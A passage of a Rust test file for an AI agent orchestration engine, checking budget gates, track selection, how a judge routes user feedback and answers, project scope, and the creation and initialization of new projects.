    // The spec spawn becomes a budget gate, and YOLO leaves it open.
    assert_eq!(h.summaries(), vec!["gate budget_reached"]);
    let g = h.open_gate("budget_reached");
    assert_eq!(
        h.summaries(),
        Vec::<String>::new(),
        "no yolo-answer for a budget gate"
    );
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "raise".into(),
            text: Some("5".into()),
        },
    );
    assert_eq!(h.summaries(), vec!["spawn generate-spec spec#1"]);
}

#[test]
fn budget_stop_ends_the_session() {
    let mut h = H::new(
        &["p"],
        SessionOptions {
            track: Some(Track::Full),
            ..Default::default()
        },
    );
    h.ctx.budget_usd = Some(1.0);
    h.classify("IMPLEMENT", &["p"]);
    spend(&mut h, "spawn explore", explore_submit(0, &[]), 2.0);
    let g = h.open_gate("budget_reached");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "stop".into(),
            text: None,
        },
    );
    assert!(h.state().failed.is_some());
    assert_eq!(h.summaries(), Vec::<String>::new());
}

#[test]
fn no_budget_means_no_limit() {
    let mut h = H::new(
        &["p"],
        SessionOptions {
            track: Some(Track::Full),
            ..Default::default()
        },
    );
    h.classify("IMPLEMENT", &["p"]);
    spend(&mut h, "spawn explore", explore_submit(0, &[]), 500.0);
    assert_eq!(h.summaries(), vec!["spawn generate-spec spec#1"]);
}

#[test]
fn init_generates_at_most_eight_skills_by_default() {
    let skills: Vec<Value> = (0..12)
        .map(|i| json!({"name": format!("s{i}"), "kind": "creation", "status": "new", "recommend": true}))
        .collect();
    let proposals = ostra_engine::init::proposals(&json!({"skills": skills}));
    assert_eq!(
        proposals
            .iter()
            .filter(|p| p.disposition == "generate")
            .count(),
        ostra_engine::init::MAX_DEFAULT_GENERATE
    );
    assert_eq!(
        proposals.iter().filter(|p| p.disposition == "drop").count(),
        4
    );
}

fn init_session() -> H {
    let mut h = H {
        id: SessionId::from("s1"),
        events: vec![],
        ctx: PlanCtx::default(),
    };
    h.ev(SessionEvent::SessionCreated {
        kind: SessionKind::Init {
            project: "p".into(),
        },
        request: String::new(),
        options: SessionOptions::default(),
        projects: vec![ProjectRef {
            key: "p".into(),
            path: PathBuf::from("/code/p"),
        }],
        workspace_root: PathBuf::from("/ws"),
        session_root: root(),
        files: vec![],
        uploads: vec![],
        pinned: vec![],
        docs_book: None,
    });
    h
}

fn detect_submit(slices: Value, existing: Value) -> Value {
    json!({"status": "ok", "summary": "s", "files": [], "result": {
        "scout_plan_path": "/ws/.ostra/sessions/s1/p/ostra-scout-plan.md",
        "stack": "go",
        "reference_name": "go",
        "slices": slices,
        "existing_skills": existing,
        "ultracode_bootstrap": false
    }})
}

#[test]
fn rule_i1_existing_skills_covering_the_project_skip_the_scouts() {
    let mut h = init_session();
    assert_eq!(h.summaries(), vec!["spawn initializer init detect"]);
    h.run(
        "spawn initializer init detect",
        detect_submit(
            json!([]),
            json!([{"name": "convention", "kind": "convention", "path": ".agents/skills/convention/SKILL.md", "description": "d"}]),
        ),
    );
    assert_eq!(h.summaries(), vec!["spawn initializer init propose"]);
}

#[test]
fn rule_i1_no_slices_and_no_existing_skills_fail() {
    let mut h = init_session();
    h.run(
        "spawn initializer init detect",
        detect_submit(json!([]), json!([])),
    );
    assert_eq!(h.summaries(), vec!["fail"]);
}

#[test]
fn rule_i1_slices_still_fan_out_beside_existing_skills() {
    let mut h = init_session();
    h.run(
        "spawn initializer init detect",
        detect_submit(
            json!([{"descriptor": "api", "slug": "api", "paths": ["api"]}]),
            json!([{"name": "entity", "kind": "other", "path": ".ostra/skills/entity/SKILL.md", "description": "d"}]),
        ),
    );
    assert_eq!(h.summaries(), vec!["spawn initializer init scout api"]);
}

// ------------------------------------------------------------------------------------------
// Tracks: IMPLEMENT is light by default; the Track judge escalates to the full track.
// ------------------------------------------------------------------------------------------

fn light(projects: &[&str]) -> H {
    let mut h = H::new(projects, SessionOptions::default());
    h.classify("IMPLEMENT", projects);
    for (i, _) in projects.iter().enumerate() {
        h.run(
            &format!("spawn explore explore#{i}"),
            explore_submit(i, &[]),
        );
    }
    h.decide(
        JudgeKind::Track,
        None,
        json!({"track": "light", "reason": "r"}),
    );
    h
}

fn feedback(h: &mut H, text: &str) {
    let g = h.open_gate("implementation_review");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "feedback".into(),
            text: Some(text.into()),
        },
    );
}

#[test]
fn track_is_judged_after_research_and_light_skips_spec_and_plan() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.classify("IMPLEMENT", &["p"]);
    h.run("spawn explore explore#0", explore_submit(0, &[]));
    assert_eq!(h.summaries(), vec!["judge track"]);
    h.decide(
        JudgeKind::Track,
        None,
        json!({"track": "light", "reason": "r"}),
    );
    assert_eq!(h.summaries(), vec!["spawn implementer phase 1 initial"]);
    let req = h.spawn_step("spawn implementer");
    // The light track builds from the research, because there is no spec.
    assert_eq!(req.inputs.research_docs.len(), 1);
    assert!(req.inputs.phase.unwrap().file.is_none());
    let st = h.state();
    assert!(st.spec.runs.is_empty() && st.stakes.is_none());
}

#[test]
fn track_full_runs_the_spec() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.classify("IMPLEMENT", &["p"]);
    h.run("spawn explore explore#0", explore_submit(0, &[]));
    h.decide(
        JudgeKind::Track,
        None,
        json!({"track": "full", "reason": "a contract changes"}),
    );
    assert_eq!(h.summaries(), vec!["spawn generate-spec spec#1"]);
}

#[test]
fn track_forced_on_the_new_task_form_skips_the_judge() {
    let mut h = H::new(
        &["p"],
        SessionOptions {
            track: Some(Track::Light),
            ..Default::default()
        },
    );
    h.classify("IMPLEMENT", &["p"]);
    h.run("spawn explore explore#0", explore_submit(0, &[]));
    assert_eq!(h.summaries(), vec!["spawn implementer phase 1 initial"]);
}

#[test]
fn track_can_be_overridden_until_a_phase_starts() {
    let mut h = light(&["p"]);
    let id = h.state().track_decision.clone().unwrap();
    assert!(h.state().can_override(&id));
    h.ev(SessionEvent::DecisionOverridden {
        id: id.clone(),
        output: json!({"track": "full", "reason": "user"}),
        reason: "user".into(),
    });
    assert_eq!(h.summaries(), vec!["spawn generate-spec spec#1"]);
    assert!(h.state().phases.is_empty());
}

// ------------------------------------------------------------------------------------------
// F1: after every phase finishes, the user reviews the result until they accept it.
// F2: a revision reads the engine-written session context file.
// ------------------------------------------------------------------------------------------

#[test]
fn f1_feedback_builds_a_reviewed_revision_then_asks_again() {
    let mut h = light(&["p"]);
    h.pass_phase(1);
    assert_eq!(h.summaries(), vec!["gate implementation_review"]);
    feedback(&mut h, "Show the cancel button only for open orders.");
    // Rule J1: even one project with no spec goes through the judge.
    assert_eq!(h.summaries(), vec!["judge feedback 0"]);
    h.decide(
        JudgeKind::Feedback,
        Some("0"),
        json!({"route": "implementation_detail", "targets": [{"project": "p", "instruction": "Show the cancel button only for open orders."}], "items": [], "research": [], "reason": "r"}),
    );
    assert_eq!(h.summaries(), vec!["spawn implementer phase 2 initial"]);
    let req = h.spawn_step("spawn implementer phase 2");
    assert_eq!(req.inputs.revision, Some(1));
    assert!(
        req.inputs
            .task
            .as_deref()
            .unwrap()
            .contains("only for open orders")
    );
    assert_eq!(
        req.inputs.context_files,
        vec![root().join("ostra-session-context.md")]
    );
    assert_eq!(
        req.inputs.prior_reports,
        vec![PathBuf::from(
            "/ws/.ostra/sessions/s1/p/ostra-implementer-phase-1.md"
        )]
    );
    h.pass_phase(2);
    let g = h.open_gate("implementation_review");
    let GatePayload::ImplementationReview { round, reports, .. } = &h.state().gates[&g].payload
    else {
        panic!()
    };
    assert_eq!((*round, reports.len()), (2, 2));
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "done".into(),
            text: None,
        },
    );
    // Accepting moves on to the closing stages (Rule D8).
    assert_eq!(h.summaries(), vec!["command format p"]);
}

#[test]
fn f1_feedback_across_projects_is_judged_and_builds_one_revision_per_target() {
    let mut h = light(&["api", "web"]);
    h.pass_phase(1);
    h.pass_phase(2);
    feedback(&mut h, "Return the reason and show it.");
    assert_eq!(h.summaries(), vec!["judge feedback 0"]);
    h.decide(
        JudgeKind::Feedback,
        Some("0"),
        json!({"route": "implementation_detail", "targets": [
            {"project": "api", "instruction": "Return the reason."},
            {"project": "web", "instruction": "Show the reason."},
            {"project": "nope", "instruction": "Dropped: not a project."}
        ], "reason": "r"}),
    );
    // Different projects build in parallel (Rule M2).
    assert_eq!(
        h.summaries(),
        vec![
            "spawn implementer phase 3 initial",
            "spawn implementer phase 4 initial"
        ]
    );
    assert_eq!(h.state().phases[&4].info.project, "web");
}

#[test]
fn f1_a_requirement_change_goes_into_the_spec_before_the_revision() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    h.pass_phase(1);
    feedback(
        &mut h,
        "Cancelled orders must also refund the shipping fee.",
    );
    assert_eq!(h.summaries(), vec!["judge feedback 0"]);
    h.decide(
        JudgeKind::Feedback,
        Some("0"),
        json!({"route": "requirement_change", "targets": [{"project": "p", "instruction": "Refund the shipping fee."}], "reason": "r"}),
    );
    // Rule D10: the spec changes first; no revision is built yet.
    let spec = h.spawn_step("spawn generate-spec spec#2");
    assert!(spec.inputs.changes[0].contains("shipping fee"));
    h.run("spawn generate-spec", spec_submit(0, 0));
    h.run(
        "spawn fact-check fact-check-spec",
        fact("PASS", "spec", &[]),
    );
    let g = h.open_gate("spec_approval");
    h.answer(
        &g,
        GateAnswer::Approval {
            approved: true,
            feedback: None,
        },
    );
    // The approved plan stays; the change builds as a revision phase.
    assert_eq!(h.summaries(), vec!["spawn implementer phase 2 initial"]);
    assert_eq!(h.state().plan.runs.len(), 1);
}

#[test]
fn f1_yolo_accepts_the_implementation() {
    let mut h = light(&["p"]);
    h.pass_phase(1);
    h.open_gate("implementation_review");
    h.ev(SessionEvent::YoloSet { enabled: true });
    assert_eq!(h.summaries(), vec!["yolo-answer"]);
    let st = h.state();
    let gate = st.open_gates().next().unwrap().id.clone();
    assert!(matches!(
        ostra_engine::judge_input::yolo_plan(&st, &gate),
        Some(ostra_engine::judge_input::YoloPlan::Fixed { .. })
    ));
}

// ------------------------------------------------------------------------------------------
// J1: every answer with content goes through the judge, which delivers, remembers, or discards
// each part and may queue research first.
// ------------------------------------------------------------------------------------------

fn qa(id: &str, answer: &str) -> QuestionAnswer {
    QuestionAnswer {
        id: id.into(),
        question: "Which?".into(),
        answer: answer.into(),
    }
}

#[test]
fn j1_a_research_answer_runs_explore_before_the_spec() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(2, 0));
    let g = h.open_gate("open_questions");
    h.answer(
        &g,
        GateAnswer::Questions {
            answers: vec![qa("Q1", "A"), qa("Q2", "Run a research pass")],
        },
    );
    assert_eq!(h.summaries(), vec![format!("judge route-answer {g}")]);
    h.route(
        &g,
        json!({"route": "requirement_change", "items": [
            {"id": "Q1", "disposition": "deliver", "stages": [], "note": ""},
            {"id": "Q2", "disposition": "deliver", "stages": [], "note": ""}
        ], "research": [{"project": "p", "task": "Retrieve the docs of a Rust PostgreSQL client."}], "reason": "r"}),
    );
    // The spec waits for the research instead of receiving the request for it.
    assert_eq!(h.summaries(), vec!["spawn explore explore#1"]);
    let ex = h.spawn_step("spawn explore explore#1");
    assert!(
        ex.inputs
            .task
            .as_deref()
            .unwrap()
            .starts_with("Retrieve the docs of a Rust PostgreSQL client.")
    );
    h.run("spawn explore explore#1", explore_submit(1, &[]));
    let rerun = h.spawn_step("spawn generate-spec");
    let answers = &rerun.inputs.answers;
    assert_eq!(answers[0], qa("Q1", "A"));
    assert!(answers[1].answer.starts_with("Run a research pass\n"));
    assert_eq!(
        rerun.inputs.new_research_docs,
        vec![PathBuf::from(
            "/ws/.ostra/sessions/s1/p/ostra-research-1.md"
        )]
    );
}

#[test]
fn j1_research_is_capped_and_kept_in_the_session_projects() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(1, 0));
    let g = h.open_gate("open_questions");
    h.answer(
        &g,
        GateAnswer::Questions {
            answers: vec![qa("Q1", "Research all of it")],
        },
    );
    let tasks: Vec<Value> = (0..5)
        .map(|i| json!({"project": if i == 0 { "nope" } else { "p" }, "task": format!("t{i}")}))
        .collect();
    h.route(
        &g,
        json!({"route": "requirement_change", "items": [], "research": tasks, "reason": "r"}),
    );
    let st = h.state();
    assert_eq!(
        st.explore.len(),
        1 + ostra_engine::judge::MAX_ANSWER_RESEARCH
    );
    assert!(st.explore.iter().all(|t| t.project == "p"));
}

#[test]
fn j1_discarded_and_remembered_answers_do_not_reach_the_spec() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(2, 0));
    let g = h.open_gate("open_questions");
    h.answer(
        &g,
        GateAnswer::Questions {
            answers: vec![
                qa("Q1", "Ignore this one, it does not matter"),
                qa("Q2", "Use tokio-postgres when you build it"),
            ],
        },
    );
    h.route(
        &g,
        json!({"route": "implementation_detail", "items": [
            {"id": "Q1", "disposition": "discard", "stages": [], "note": ""},
            {"id": "Q2", "disposition": "remember", "stages": ["implement"], "note": "Use the tokio-postgres crate."}
        ], "research": [], "reason": "r"}),
    );
    let rerun = h.spawn_step("spawn generate-spec");
    let answers = rerun.inputs.answers;
    assert!(!answers[0].answer.contains("Ignore this one"));
    assert!(answers[0].answer.contains("chose not to answer"));
    assert!(answers[1].answer.contains("later stage"));
    // The remembered note reaches the implementer, and only it.
    h.run("spawn generate-spec", spec_submit(0, 0));
    h.run("spawn fact-check", fact("PASS", "spec", &[]));
    let a = h.open_gate("spec_approval");
    h.answer(
        &a,
        GateAnswer::Approval {
            approved: true,
            feedback: None,
        },
    );
    assert_eq!(
        h.summaries(),
        vec!["judge stakes"],
        "a bare approval is not routed"
    );
    h.decide(
        JudgeKind::Stakes,
        None,
        json!({"stakes": "low", "reason": "r"}),
    );
    let imp = h.spawn_step("spawn implementer phase 1 initial");
    assert_eq!(
        imp.inputs.user_notes,
        vec!["Use the tokio-postgres crate.".to_string()]
    );
    h.run(
        "spawn implementer phase 1 initial",
        impl_submit(1, &["src/a.rs"]),
    );
    let review = h.spawn_step("spawn code-reviewer");
    assert!(review.inputs.user_notes.is_empty());
}

#[test]
fn j1_approval_text_waits_for_the_judge() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(0, 0));
    h.run("spawn fact-check", fact("PASS", "spec", &[]));
    let g = h.open_gate("spec_approval");
    h.answer(
        &g,
        GateAnswer::Approval {
            approved: true,
            feedback: Some("Looks right. The docs should mention the new flag.".into()),
        },
    );
    assert_eq!(h.summaries(), vec![format!("judge route-answer {g}")]);
    assert!(!h.state().spec.approved);
    h.route(
        &g,
        json!({"route": "implementation_detail", "items": [
            {"id": "answer", "disposition": "remember", "stages": ["docs"], "note": "Mention the new flag."}
        ], "research": [], "reason": "r"}),
    );
    let st = h.state();
    assert!(
        st.spec.approved,
        "a note for later stages keeps the approval"
    );
    assert_eq!(
        st.notes_for(ostra_engine::judge::NoteStage::Docs),
        vec!["Mention the new flag."]
    );
    assert_eq!(h.summaries(), vec!["judge stakes"]);
}

#[test]
fn j1_a_delivered_approval_text_changes_the_spec_even_when_approved() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(0, 0));
    h.run("spawn fact-check", fact("PASS", "spec", &[]));
    let g = h.open_gate("spec_approval");
    h.answer(
        &g,
        GateAnswer::Approval {
            approved: true,
            feedback: Some("Approved, but cancellations must also refund the fee.".into()),
        },
    );
    h.deliver(&g);
    assert!(!h.state().spec.approved);
    let rev = h.spawn_step("spawn generate-spec");
    assert_eq!(
        rev.inputs.changes,
        vec!["Approved, but cancellations must also refund the fee.".to_string()]
    );
}

#[test]
fn j1_a_stuck_answer_can_ask_for_research_first() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (id, _) = h.start("spawn implementer");
    h.finish(&id, ExecutionStatus::Ok, Some(json!({"status": "stuck", "report_path": "/r", "summary": "s", "stuck": {"diagnostic": "d", "need": "the shutdown API"}})));
    h.decide(
        JudgeKind::Rescue,
        Some(id.as_str()),
        json!({"action": "gate", "reason": "r"}),
    );
    let g = h.open_gate("stuck");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "fact".into(),
            text: Some("I don't know. Look up how rmcp shuts down a stdio server.".into()),
        },
    );
    assert_eq!(h.summaries(), vec![format!("judge route-answer {g}")]);
    h.route(
        &g,
        json!({"route": "implementation_detail", "items": [], "research": [{"project": "p", "task": "How rmcp shuts down a stdio server."}], "reason": "r"}),
    );
    let ex = h.spawn_step("spawn explore");
    h.run(&Step::Spawn(Box::new(ex)).summary(), explore_submit(7, &[]));
    let rerun = h.spawn_step("spawn implementer phase 1 rescue");
    let ctx = rerun.inputs.instructions.unwrap();
    assert!(ctx.contains("Look up how rmcp") && ctx.contains("ostra-research-7.md"));
}

#[test]
fn j1_a_discarded_stuck_answer_leaves_the_phase_blocked() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (id, _) = h.start("spawn implementer");
    h.finish(&id, ExecutionStatus::Ok, Some(json!({"status": "stuck", "report_path": "/r", "summary": "s", "stuck": {"diagnostic": "d", "need": "n"}})));
    h.decide(
        JudgeKind::Rescue,
        Some(id.as_str()),
        json!({"action": "gate", "reason": "r"}),
    );
    let g = h.open_gate("stuck");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "fact".into(),
            text: Some("Never mind, disregard what I typed.".into()),
        },
    );
    h.route(
        &g,
        json!({"route": "implementation_detail", "items": [{"id": "answer", "disposition": "discard", "stages": [], "note": ""}], "research": [], "reason": "r"}),
    );
    assert!(h.state().phases[&1].impl_loop.is_blocked());
}

#[test]
fn j1_feedback_kept_for_later_accepts_and_discarded_feedback_asks_again() {
    let mut h = light(&["p"]);
    h.pass_phase(1);
    feedback(
        &mut h,
        "Looks good. When you document it, mention the flag.",
    );
    h.decide(
        JudgeKind::Feedback,
        Some("0"),
        json!({"route": "implementation_detail", "targets": [{"project": "p", "instruction": "x"}], "items": [{"id": "answer", "disposition": "remember", "stages": ["docs"], "note": "Mention the flag."}], "research": [], "reason": "r"}),
    );
    assert!(h.state().feedback.accepted);
    assert_eq!(h.summaries(), vec!["command format p"]);

    let mut h = light(&["p"]);
    h.pass_phase(1);
    feedback(&mut h, "Ignore that, I typed into the wrong box.");
    h.decide(
        JudgeKind::Feedback,
        Some("0"),
        json!({"route": "implementation_detail", "targets": [{"project": "p", "instruction": "x"}], "items": [{"id": "answer", "disposition": "discard", "stages": [], "note": ""}], "research": [], "reason": "r"}),
    );
    assert_eq!(h.state().phases.len(), 1, "no revision is built");
    assert_eq!(h.summaries(), vec!["gate implementation_review"]);
}

#[test]
fn j1_answers_recorded_before_the_rule_fold_as_they_did() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(1, 0));
    let g = h.open_gate("open_questions");
    h.answer_as(
        &g,
        GateAnswer::Questions {
            answers: vec![qa("Q1", "A")],
        },
        false,
    );
    // Rule D3 as it was: the answer went straight to generate-spec.
    assert_eq!(
        h.summaries(),
        vec!["spawn generate-spec spec#2 (continues)"]
    );
}

#[test]
fn j1_only_answers_with_content_are_routed() {
    use ostra_engine::state::answer_needs_route;
    let approval = GatePayload::SpecApproval {
        spec_path: PathBuf::new(),
        summary: String::new(),
        findings: vec![],
    };
    let yes = |feedback: Option<&str>| GateAnswer::Approval {
        approved: true,
        feedback: feedback.map(String::from),
    };
    assert!(!answer_needs_route(&approval, &yes(None)));
    assert!(!answer_needs_route(&approval, &yes(Some("  "))));
    assert!(answer_needs_route(&approval, &yes(Some("and rename it"))));
    let budget = GatePayload::BudgetReached {
        spent_usd: 1.0,
        budget_usd: 1.0,
    };
    let raise = GateAnswer::Choice {
        option: "raise".into(),
        text: Some("5".into()),
    };
    assert!(
        !answer_needs_route(&budget, &raise),
        "a budget is the user's call, applied as typed"
    );
}

#[test]
fn j1_a_typed_answer_reaches_the_spec_with_the_numbered_options() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(2, 0));
    let g = h.open_gate("open_questions");
    h.answer(
        &g,
        GateAnswer::Questions {
            answers: vec![qa("Q1", "1 and 2, plus an audit log"), qa("Q2", "B")],
        },
    );
    h.deliver(&g);
    let answers = h.spawn_step("spawn generate-spec").inputs.answers;
    assert!(
        answers[0]
            .answer
            .starts_with("1 and 2, plus an audit log\n")
    );
    assert!(answers[0].answer.contains("1. A: a; 2. B: b"));
    assert_eq!(answers[1].answer, "B", "a picked option goes as is");
}

#[test]
fn j1_a_later_answer_forgets_a_kept_note() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(1, 0));
    let g = h.open_gate("open_questions");
    h.answer(
        &g,
        GateAnswer::Questions {
            answers: vec![qa("Q1", "A. Build it with tokio-postgres.")],
        },
    );
    h.route(
        &g,
        json!({"route": "implementation_detail", "items": [{"id": "Q1", "disposition": "deliver", "note": "Use tokio-postgres.", "stages": ["implement"]}], "research": [], "forget": [], "reason": "r"}),
    );
    h.run("spawn generate-spec", spec_submit(0, 0));
    h.run("spawn fact-check", fact("PASS", "spec", &[]));
    let a = h.open_gate("spec_approval");
    h.answer(
        &a,
        GateAnswer::Approval {
            approved: true,
            feedback: Some("Approved. Use sqlx, not tokio-postgres.".into()),
        },
    );
    // A decision for a gate that no longer waits forgets nothing.
    h.route(
        &g,
        json!({"route": "implementation_detail", "items": [], "research": [], "forget": ["N1"], "reason": "stale"}),
    );
    assert!(!h.state().user_notes[0].forgotten);
    h.route(
        &a,
        json!({"route": "implementation_detail", "items": [{"id": "answer", "disposition": "remember", "note": "Use sqlx.", "stages": ["implement"]}], "research": [], "forget": ["N1"], "reason": "r"}),
    );
    let st = h.state();
    assert!(st.user_notes[0].forgotten, "the note stays in the log");
    assert_eq!(st.user_notes[1].id, "N2");
    h.decide(
        JudgeKind::Stakes,
        None,
        json!({"stakes": "low", "reason": "r"}),
    );
    let imp = h.spawn_step("spawn implementer phase 1 initial");
    assert_eq!(imp.inputs.user_notes, vec!["Use sqlx.".to_string()]);
}

#[test]
fn j1_an_answer_split_into_parts_keeps_every_note() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (id, _) = h.start("spawn implementer");
    h.finish(&id, ExecutionStatus::Ok, Some(json!({"status": "stuck", "report_path": "/r", "summary": "s", "stuck": {"diagnostic": "d", "need": "the variable"}})));
    h.decide(
        JudgeKind::Rescue,
        Some(id.as_str()),
        json!({"action": "gate", "reason": "r"}),
    );
    let g = h.open_gate("stuck");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "fact".into(),
            text: Some("It is OSTRA_ENV_FILE. In the tests, use a temp file.".into()),
        },
    );
    // Two items for one text, the second with an invented ID: both are about the answer.
    h.route(
        &g,
        json!({"route": "implementation_detail", "items": [
            {"id": "answer", "disposition": "deliver", "note": "", "stages": []},
            {"id": "answer-tests", "disposition": "remember", "note": "Use a temp file.", "stages": ["tests"]}
        ], "research": [], "forget": [], "reason": "r"}),
    );
    let st = h.state();
    assert_eq!(
        st.notes_for(ostra_engine::judge::NoteStage::Tests),
        vec!["Use a temp file."]
    );
    let rerun = h.spawn_step("spawn implementer phase 1 rescue");
    assert!(
        rerun
            .inputs
            .instructions
            .unwrap()
            .contains("OSTRA_ENV_FILE"),
        "delivered, because one part is"
    );
}

// ------------------------------------------------------------------------------------------
// O6: pinned projects are the session's only projects and its whole scope.
// ------------------------------------------------------------------------------------------

#[test]
fn o6_pinned_projects_are_the_whole_scope() {
    let mut h = H::new(&["web"], SessionOptions::default());
    if let SessionEvent::SessionCreated { pinned, .. } = &mut h.events[0].event {
        *pinned = vec!["web".into()];
    }
    h.classify("IMPLEMENT", &["api", "web"]);
    assert_eq!(h.state().scope, vec!["web".to_string()]);
    assert_eq!(h.summaries(), vec!["spawn explore explore#0"]);
    assert_eq!(h.spawn_step("spawn explore").project, "web");

    let mut h = H::new(&["api", "web"], SessionOptions::default());
    if let SessionEvent::SessionCreated { pinned, .. } = &mut h.events[0].event {
        *pinned = vec!["api".into(), "web".into()];
    }
    h.classify("IMPLEMENT", &["api"]);
    assert_eq!(h.state().scope, vec!["api".to_string(), "web".to_string()]);
}

// ------------------------------------------------------------------------------------------
// O2: only the implementer of a phase the approved plan puts in a new project creates it.
// O3: the created project joins the session's projects and scope uninitialized.
// O4: it is initialized inside the session before anything else runs in it.
// O5: the advisor looks at a failed init step before the user does.
// ------------------------------------------------------------------------------------------

fn created(key: &str, execution: &ExecutionId) -> SessionEvent {
    SessionEvent::ProjectCreated {
        project: ostra_core::manage::CreatedProject {
            key: key.into(),
            path: PathBuf::from(format!("/ws/{key}")),
            stack: "rust".into(),
            purpose: "An MCP server for the team's notes.".into(),
            requirements: vec!["Rust 2024".into(), "rmcp 3.5 over stdio".into()],
            execution: execution.clone(),
            agent: AgentName::Implementer,
        },
    }
}

/// The plan puts phase 1 in `p` and phase 2 in `mcp`, a new project, independent of each other.
fn planned_new_project() -> H {
    let mut h = H::spec_approved(&["p"], SessionOptions::default());
    h.decide(
        JudgeKind::Stakes,
        None,
        json!({"stakes": "high", "reason": "r"}),
    );
    let mut submit = plan_submit(json!([
        phase(1, "p", &[], "Skip"),
        phase(2, "mcp", &[], "Skip")
    ]));
    submit["new_projects"] = json!(["mcp"]);
    h.run("spawn plan", submit);
    h.run(
        "spawn fact-check fact-check-plan",
        fact("PASS", "plan", &[]),
    );
    let g = h.open_gate("plan_approval");
    h.answer(
        &g,
        GateAnswer::Approval {
            approved: true,
            feedback: None,
        },
    );
    h
}

/// Phase 2's implementer creates `mcp` and is stopped for the init.
fn created_by_phase() -> H {
    let mut h = planned_new_project();
    let (imp, _) = h.start("spawn implementer phase 2 initial");
    assert_eq!(h.state().project_creation_refusal(&imp, "mcp"), None);
    h.ev(created("mcp", &imp));
    assert!(
        h.state().interrupting.contains_key(&imp),
        "the run that created it stops"
    );
    h.finish(&imp, ExecutionStatus::Interrupted, None);
    h
}

/// The next steps other than phase 1's, which runs in `p` and never waits for `mcp` (Rule O4).
fn mcp_steps(h: &H) -> Vec<String> {
    h.summaries()
        .into_iter()
        .filter(|s| !s.contains("phase 1"))
        .collect()
}

fn init_ok(v: Value) -> Value {
    json!({"status": "ok", "summary": "s", "files": [], "result": v})
}

#[test]
fn rule_o2_a_phase_may_target_a_project_the_plan_names_as_new() {
    let h = planned_new_project();
    let st = h.state();
    assert_eq!(st.project_to_create("mcp"), Some(PathBuf::from("/ws/mcp")));
    assert_eq!(
        st.project_to_create("p"),
        None,
        "an existing project is not new"
    );
    let steps = h.summaries();
    assert!(
        steps.contains(&"spawn implementer phase 2 initial".to_string()),
        "{steps:?}"
    );
    let imp = h.spawn_step("spawn implementer phase 2 initial");
    assert_eq!(imp.project, "mcp");
}

#[test]
fn rule_o2_an_unnamed_unknown_project_stays_blocked() {
    let mut h = H::spec_approved(&["p"], SessionOptions::default());
    h.decide(
        JudgeKind::Stakes,
        None,
        json!({"stakes": "high", "reason": "r"}),
    );
    h.run(
        "spawn plan",
        plan_submit(json!([phase(1, "typo", &[], "Skip")])),
    );
    h.run(
        "spawn fact-check fact-check-plan",
        fact("PASS", "plan", &[]),
    );
    let g = h.open_gate("plan_approval");
    h.answer(
        &g,
        GateAnswer::Approval {
            approved: true,
            feedback: None,
        },
    );
    assert!(!h.summaries().iter().any(|s| s.contains("implementer")));
}

#[test]
fn rule_o2_only_the_phase_in_the_new_project_may_create_it() {
    let mut h = planned_new_project();
    let (other, _) = h.start("spawn implementer phase 1 initial");
    let st = h.state();
    assert!(st.project_creation_refusal(&other, "mcp").is_some());
    assert!(st.project_creation_refusal(&other, "p").is_some());
}

#[test]
fn rule_o3_a_created_project_joins_the_session_scope() {
    let h = created_by_phase();
    let st = h.state();
    assert_eq!(st.scope, vec!["p", "mcp"]);
    assert_eq!(st.project_path("mcp"), Some(PathBuf::from("/ws/mcp")));
    assert_eq!(st.project_to_create("mcp"), None, "it exists now");
    assert!(st.awaiting_init("mcp"));
}

#[test]
fn rule_o4_the_init_runs_before_anything_else_in_the_new_project() {
    let mut h = created_by_phase();
    let steps = h.summaries();
    assert!(
        steps.contains(&"spawn initializer init detect".to_string()),
        "{steps:?}"
    );
    assert!(
        !steps.iter().any(|s| s.contains("phase 2")),
        "phase 2 waits for the init: {steps:?}"
    );
    let detect = h.spawn_step("spawn initializer init detect");
    assert_eq!(detect.project, "mcp");
    let focus = &detect.inputs.init["User focus"];
    assert!(
        focus.contains("Stack: rust") && focus.contains("- rmcp 3.5 over stdio"),
        "{focus}"
    );

    h.run(
        "spawn initializer init detect",
        detect_submit(
            json!([{"descriptor": "root", "slug": "root", "paths": ["."]}]),
            json!([]),
        ),
    );
    h.run(
        "spawn initializer init scout root",
        init_ok(json!({"findings_path": "/f.md"})),
    );
    h.run(
        "spawn initializer init propose",
        init_ok(json!({"proposal_path": "/p.md", "skills": [
            {"name": "convention", "kind": "convention", "status": "new", "recommend": true, "description": "d"}
        ]})),
    );
    let g = h.open_gate("skill_approval");
    h.answer(
        &g,
        GateAnswer::Skills {
            decisions: vec![SkillDecision {
                name: "convention".into(),
                disposition: "generate".into(),
            }],
        },
    );
    h.run(
        "spawn initializer init generate-skill convention",
        init_ok(json!({"path": "/ws/mcp/.agents/skills/convention/SKILL.md"})),
    );
    h.run(
        "spawn initializer init generate-inventory",
        init_ok(json!({"inventory_path": "i", "profile_path": "p", "report_path": "r"})),
    );
    assert!(
        h.summaries().contains(&"finish-init mcp".to_string()),
        "{:?}",
        h.summaries()
    );
    assert!(!h.summaries().iter().any(|s| s.contains("phase 2")));
    h.ev(SessionEvent::ProjectInitFinished {
        project: "mcp".into(),
    });
